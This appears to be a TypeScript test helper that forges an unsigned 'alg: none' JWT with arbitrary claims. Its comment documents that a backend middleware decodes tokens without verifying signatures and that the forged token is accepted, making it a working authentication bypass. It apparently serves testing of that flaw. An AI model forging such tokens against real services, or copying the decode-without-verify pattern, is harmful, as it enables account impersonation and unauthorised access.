/**
 * Builds a syntactically-valid but completely unsigned/unverifiable JWT, for testing routes
 * protected by the backend's `authToken` middleware (middleware/tokenparser.js), which calls
 * `jwt.decode()` instead of `jwt.verify()` — it never checks the signature, only `exp`.
 * Confirmed live: a token built by this function IS accepted by those routes. Never use this
 * against anything other than this test bench's own dev instance.
 */
export function forgeUnsignedToken(claims: Record<string, unknown> = {}): string {
  const header = { alg: 'none', typ: 'JWT' };
  const payload = {
    sub: '000000000000000000000001',
    user_id: '000000000000000000000001',
    exp: Math.floor(Date.now() / 1000) + 3600,
    ...claims,
  };
  const base64url = (obj: unknown) => Buffer.from(JSON.stringify(obj)).toString('base64url');
  return `${base64url(header)}.${base64url(payload)}.forged-signature-never-checked`;
}
